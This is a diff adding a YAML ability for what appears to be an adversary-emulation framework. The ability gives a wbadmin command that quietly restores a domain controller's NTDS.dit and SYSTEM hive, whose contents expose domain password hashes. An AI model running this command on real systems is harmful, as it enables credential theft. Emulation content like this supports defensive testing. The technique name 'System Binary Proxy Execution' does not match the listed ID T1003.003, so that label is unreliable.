@@ -1,0 +1,25 @@
+- id: 8929d846-f194-3424-3e4c-1714d7791b7d
+  name: wbadmin.exe - Restore a version of NTDS.dit and SYSTEM hive into file path.
+    The command `wbadmin get versions` can be used to find version identifiers.
+  description: Restore a version of NTDS.dit and SYSTEM hive into file path. The command
+    `wbadmin get versions` can be used to find version identifiers.
+  tactic: credential-access
+  technique:
+    attack_id: T1003.003
+    name: System Binary Proxy Execution
+  platforms:
+    windows:
+      cmd:
+        command: wbadmin start recovery -version:<VERSIONIDENTIFIER> -recoverytarget:#{host.dir.temp}
+          -itemtype:file -items:C:\Windows\NTDS\NTDS.dit,C:\Windows\System32\config\SYSTEM
+          -notRestoreAcl -quiet
+  singleton: false
+  privilege: Elevated
+  repeatable: true
+  buckets:
+  - credential-access
+  version: '1.0'
+  author: Chris Eastwood
+  created: '2024-04-05'
+  modified: '2024-04-05'
+  operating_system: Windows All Versions
